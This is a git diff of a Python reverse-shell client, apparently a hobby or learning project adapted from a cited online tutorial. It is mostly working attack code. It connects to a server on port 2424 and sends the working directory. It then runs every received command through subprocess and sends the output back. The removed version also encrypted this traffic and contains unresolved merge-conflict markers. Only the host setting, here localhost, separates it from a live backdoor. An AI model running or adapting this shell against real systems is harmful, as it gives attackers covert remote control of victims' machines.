@@ -1,85 +1,57 @@
 import socket
 import os
 import subprocess
-import sys
-import hellobitch.cryptofernet as crypt
-
 # https://www.thepythoncode.com/article/create-reverse-shell-python#:~:text=How%20to%20Create%20a%20Reverse%20Shell%20in%20Python,are%20some%20ideas%20to%20extend%20that%20code%3A%20
 
-print(sys.argv)
-SERVER_HOST = sys.argv[1]
-<<<<<<< HEAD:main.py
-__CLEF__ = crypt.create_key()
-SERVER_PORT = 2424
-BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
-=======
-
+SERVER_HOST = '127.0.0.1'  #sys.argv[1]
 SERVER_PORT = 2424
 BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
+SEPARATOR = '<sep>'  # separator string for sending 2 messages in one go
 
->>>>>>> remotes/origin/SSL_Communication:Client.py
-# separator string for sending 2 messages in one go
-SEPARATOR = "<sep>"
+# create the socket object
+sock = socket.socket()
 
-if __name__ == "__main__":
-    # create the socket object
-    s = socket.socket()
+# connect to the server
+sock.connect((SERVER_HOST, SERVER_PORT))
 
-    # connect to the server
-    s.connect((SERVER_HOST, SERVER_PORT))
+# get the current directory
+current_dir = os.getcwd()
+sock.send(current_dir.encode(encoding='utf-8'))
 
-    # get the current directory
-    cwd = os.getcwd()
-<<<<<<< HEAD:main.py
-    cwd_encrypted = crypt.encrypt_str(__CLEF__, cwd)
-    s.send(__CLEF__)
-    s.send(cwd_encrypted)
-=======
-    s.send(cwd.encode(encoding='utf-8'))
->>>>>>> remotes/origin/SSL_Communication:Client.py
+while True:
+    # receive the command from the server
+    command = sock.recv(BUFFER_SIZE).decode().strip()
+    if not command:
+        continue
 
-    while True:
-        # receive the command from the server
-        command = s.recv(BUFFER_SIZE).decode()
-<<<<<<< HEAD:main.py
-#        command_decrypt = crypt.decrypt_str(__CLEF__, command)
-       # command_decrypt = crypt.decrypt_str(command)
-        if not command:
-            continue
-        splited_command = command
-        if command.lower() == "exit":
-            # if the command is exit, just break out of the loop
-            break
-        if splited_command.lower() == "cd":
-=======
-        if not command:
-            continue
+    if command.lower() == 'exit':
+        break  # if the command is exit, just break out of the loop
+    
+    if command[:2] == 'cd':  # cd command, change directory (str[start:end:step])
+        try:
+            # remove cd and remove leading space 
+            command = command[2:].strip()  # removing ending at the same time because why not
+            
+            
+            if len(command) < 3:
+                command += 'c:\\'[len(command):] # c: --> c:\ and c --> c:\                    at least I hope
+            
+            os.chdir(command)
 
-        if command.lower() == "exit":
-            # if the command is exit, just break out of the loop
-            break
-        if command.lower() == "cd":
->>>>>>> remotes/origin/SSL_Communication:Client.py
-            # cd command, change directory
-            try:
-                os.chdir(command)
-            except FileNotFoundError as e:
-                # if there is an error, set as the output
-                output = str(e)
-            else:
-                # if operation is successful, empty message
-                output = ""
+        except FileNotFoundError as err:
+            output = str(err)  # if there is an error, set as the output
+        
         else:
-            # execute the command and retrieve the results
-            output = subprocess.getoutput(command)
-        # get the current working directory as output
-        cwd = os.getcwd()
-        # send the results back to the server
-        message_encrypt = crypt.encrypt_str(__CLEF__, f"{output}{SEPARATOR}{cwd}")
-        output = crypt.encrypt_str(__CLEF__, output)
-        #s.send(output)
-        #cwd = f'{cwd}'
-        #s.send(crypt.encrypt_str(__CLEF__, cwd))
-        s.send(message_encrypt)
-    # close client connection
-    s.close()
+            output = ''  # if operation is successful, empty message
+    else:
+        # execute the command and retrieve the results
+        output = subprocess.getoutput(command)
+
+    # get the current working directory as output
+    current_dir = os.getcwd()
+
+    # send the results back to the server
+    message = f'{output}{SEPARATOR}{current_dir}'
+    sock.send(message.encode())
+
+sock.close()  # close client connection
